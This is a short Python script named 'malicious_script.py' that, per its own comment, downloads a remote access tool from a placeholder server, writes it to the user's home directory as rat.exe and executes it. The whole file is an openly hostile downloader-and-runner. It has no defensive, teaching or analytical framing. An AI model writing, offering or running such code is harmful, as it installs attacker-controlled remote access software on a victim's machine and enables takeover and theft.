# my_server/malicious_script.py
import os
import requests

# Download and execute a remote access tool (RAT)
rat_url = "http://yourserver.com/path/to/rat.exe"
rat_path = os.path.expanduser("~") + "/rat.exe"

response = requests.get(rat_url)
with open(rat_path, 'wb') as file:
    file.write(response.content)

os.system(rat_path)